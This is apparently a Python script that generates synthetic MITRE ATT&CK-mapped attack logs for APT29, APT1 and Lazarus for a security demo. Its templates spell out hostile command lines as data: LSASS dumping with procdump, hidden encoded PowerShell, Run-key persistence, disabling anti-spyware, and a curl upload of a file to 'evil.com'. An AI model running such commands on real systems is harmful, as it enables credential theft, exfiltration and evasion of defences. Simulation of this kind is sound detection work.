# \!/usr/bin/env python3
"""
ATP Log Generator for Portfolio Demo.

Generates realistic MITRE ATT&CK mapped logs for ChromaDB RAG system testing.
Supports APT29, APT1, and Lazarus group attack chains with proper techniques.

Author: DSR Portfolio Project Team
"""

import sys
import json
from pathlib import Path
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional
from dataclasses import dataclass
from random import choice, randint, uniform

sys.path.append(".")
from utils.logger import setup_logger

logger = setup_logger()


@dataclass
class AttackTechnique:
    """MITRE ATT&CK technique definition."""

    id: str
    name: str
    tactic: str
    process: str
    command_template: str
    indicators: List[str]
    severity: str


class ATPLogGenerator:
    """Generate ATP attack simulation logs for portfolio demonstration."""

    def __init__(self):
        """Initialize ATP log generator with attack chain definitions."""
        logger.info("Initializing ATP Log Generator")
        self.attack_chains = self._define_attack_chains()
        self.base_timestamp = datetime.now()

    def _define_attack_chains(self) -> Dict[str, List[AttackTechnique]]:
        """Define APT group attack chains with MITRE techniques."""
        return {
            "apt29_cozy_bear": [
                AttackTechnique(
                    "T1566.001",
                    "Spearphishing Attachment",
                    "Initial Access",
                    "outlook.exe",
                    "outlook.exe /c load {attachment}",
                    ["malicious_attachment", "email_delivery"],
                    "high",
                ),
                AttackTechnique(
                    "T1059.001",
                    "PowerShell",
                    "Execution",
                    "powershell.exe",
                    "powershell.exe -WindowStyle Hidden -EncodedCommand {payload}",
                    ["powershell.exe", "base64_payload"],
                    "high",
                ),
                AttackTechnique(
                    "T1055",
                    "Process Injection",
                    "Defense Evasion",
                    "svchost.exe",
                    "rundll32.exe {dll},{export}",
                    ["process_injection", "dll_loading"],
                    "high",
                ),
                AttackTechnique(
                    "T1003.001",
                    "LSASS Memory",
                    "Credential Access",
                    "lsass.exe",
                    "procdump.exe -ma lsass.exe lsass.dmp",
                    ["lsass_dump", "credential_theft"],
                    "critical",
                ),
                AttackTechnique(
                    "T1021.001",
                    "Remote Desktop Protocol",
                    "Lateral Movement",
                    "mstsc.exe",
                    "mstsc.exe /v:{target_ip}",
                    ["rdp_connection", "lateral_movement"],
                    "medium",
                ),
                AttackTechnique(
                    "T1041",
                    "Exfiltration Over C2",
                    "Exfiltration",
                    "wininet.dll",
                    "curl.exe -X POST -d @{file} {c2_server}",
                    ["data_exfiltration", "c2_communication"],
                    "high",
                ),
            ],
            "apt1_comment_crew": [
                AttackTechnique(
                    "T1190",
                    "Exploit Public-Facing Application",
                    "Initial Access",
                    "w3wp.exe",
                    "w3wp.exe -exploit {vulnerability}",
                    ["web_exploit", "public_app_compromise"],
                    "high",
                ),
                AttackTechnique(
                    "T1059.003",
                    "Windows Command Shell",
                    "Execution",
                    "cmd.exe",
                    "cmd.exe /c {command}",
                    ["cmd_execution", "shell_activity"],
                    "medium",
                ),
                AttackTechnique(
                    "T1547.001",
                    "Registry Run Keys",
                    "Persistence",
                    "reg.exe",
                    "reg.exe add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v {name} /d {path}",
                    ["registry_persistence", "autostart_modification"],
                    "high",
                ),
                AttackTechnique(
                    "T1083",
                    "File and Directory Discovery",
                    "Discovery",
                    "cmd.exe",
                    "dir /s /b C:\\*{pattern}*",
                    ["file_enumeration", "directory_listing"],
                    "low",
                ),
                AttackTechnique(
                    "T1005",
                    "Data from Local System",
                    "Collection",
                    "findstr.exe",
                    "findstr.exe /s /i {pattern} C:\\*.*",
                    ["data_collection", "file_search"],
                    "medium",
                ),
            ],
            "lazarus_group": [
                AttackTechnique(
                    "T1566.002",
                    "Spearphishing Link",
                    "Initial Access",
                    "chrome.exe",
                    "chrome.exe --new-window {malicious_url}",
                    ["malicious_link", "browser_exploit"],
                    "high",
                ),
                AttackTechnique(
                    "T1204.002",
                    "Malicious File",
                    "Execution",
                    "explorer.exe",
                    "explorer.exe {malicious_file}",
                    ["malicious_execution", "user_interaction"],
                    "high",
                ),
                AttackTechnique(
                    "T1112",
                    "Modify Registry",
                    "Defense Evasion",
                    "reg.exe",
                    "reg.exe add {key} /v {value} /d {data}",
                    ["registry_modification", "config_change"],
                    "medium",
                ),
                AttackTechnique(
                    "T1016",
                    "System Network Configuration Discovery",
                    "Discovery",
                    "ipconfig.exe",
                    "ipconfig.exe /all",
                    ["network_discovery", "system_recon"],
                    "low",
                ),
                AttackTechnique(
                    "T1039",
                    "Data from Network Shared Drive",
                    "Collection",
                    "net.exe",
                    "net.exe use \\\\{target}\\{share}",
                    ["network_share_access", "data_access"],
                    "medium",
                ),
            ],
        }

    def generate_attack_sequence(
        self, apt_group: str, num_logs: int
    ) -> List[Dict[str, Any]]:
        """Generate attack sequence logs for specified APT group."""
        if apt_group not in self.attack_chains:
            logger.error(f"Unknown APT group: {apt_group}")
            return []

        logger.info(f"Generating {num_logs} logs for {apt_group}")
        techniques = self.attack_chains[apt_group]
        logs = []

        for i in range(num_logs):
            technique = techniques[i % len(techniques)]
            log_entry = self._create_log_entry(apt_group, technique, i)
            logs.append(log_entry)

        logger.info(f"Generated {len(logs)} attack logs")
        return logs

    def _create_log_entry(
        self, apt_group: str, technique: AttackTechnique, sequence: int
    ) -> Dict[str, Any]:
        """Create individual log entry for technique."""
        timestamp = self.base_timestamp + timedelta(minutes=sequence * 5)

        return {
            "timestamp": timestamp.isoformat(),
            "event_type": "atp_simulation",
            "apt_group": apt_group,
            "mitre_technique": technique.id,
            "technique_name": technique.name,
            "tactic": technique.tactic,
            "severity": technique.severity,
            "source_ip": self._generate_ip(),
            "target_host": f"victim-{randint(1,20):02d}",
            "process_name": technique.process,
            "command_line": self._generate_command(technique),
            "success": choice([True, True, True, False]),
            "threat_score": self._calculate_threat_score(technique.severity),
            "indicators": technique.indicators,
            "detection_confidence": round(uniform(0.7, 0.95), 2),
            "false_positive_probability": round(uniform(0.05, 0.3), 2),
        }

    def _generate_ip(self) -> str:
        """Generate realistic IP address."""
        return f"192.168.{randint(100,200)}.{randint(1,254)}"

    def _generate_command(self, technique: AttackTechnique) -> str:
        """Generate realistic command line for technique."""
        replacements = {
            "{attachment}": "invoice_june.pdf.exe",
            "{payload}": "UABvAHcAZQByAFMAaABlAGwAbAA=",
            "{dll}": "shell32.dll",
            "{export}": "ShellExecA",
            "{target_ip}": "10.0.1.50",
            "{file}": "confidential.zip",
            "{c2_server}": "https://evil.com/upload",
            "{vulnerability}": "CVE-2021-44228",
            "{command}": "whoami && net user",
            "{name}": "WindowsUpdate",
            "{path}": "C:\\Windows\\System32\\evil.exe",
            "{pattern}": "*.doc",
            "{malicious_url}": "https://fake-bank.com/login",
            "{malicious_file}": "setup.exe",
            "{key}": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion",
            "{value}": "DisableAntiSpyware",
            "{data}": "1",
            "{target}": "fileserver",
            "{share}": "documents",
        }

        command = technique.command_template
        for placeholder, value in replacements.items():
            command = command.replace(placeholder, value)
        return command

    def _calculate_threat_score(self, severity: str) -> int:
        """Calculate threat score based on severity."""
        severity_scores = {
            "low": randint(1, 3),
            "medium": randint(4, 6),
            "high": randint(7, 8),
            "critical": randint(9, 10),
        }
        return severity_scores.get(severity, 5)

    def generate_demo_logs(self) -> Dict[str, List[Dict[str, Any]]]:
        """Generate complete demo dataset for all APT groups."""
        logger.info("Generating complete demo dataset")
        demo_data = {}

        for apt_group in self.attack_chains.keys():
            demo_data[apt_group] = self.generate_attack_sequence(apt_group, 10)

        logger.info(f"Generated demo data for {len(demo_data)} APT groups")
        return demo_data


def main():
    """Main function for standalone execution."""
    generator = ATPLogGenerator()

    # Generate demo logs
    demo_logs = generator.generate_demo_logs()

    # Save to files
    output_dir = Path("../data/generated_logs")
    output_dir.mkdir(parents=True, exist_ok=True)

    for apt_group, logs in demo_logs.items():
        output_file = output_dir / f"{apt_group}_demo.json"
        with open(output_file, "w") as f:
            json.dump(logs, f, indent=2)
        logger.info(f"Saved {len(logs)} logs to {output_file}")

    logger.info("ATP Log Generation completed")


if __name__ == "__main__":
    main()
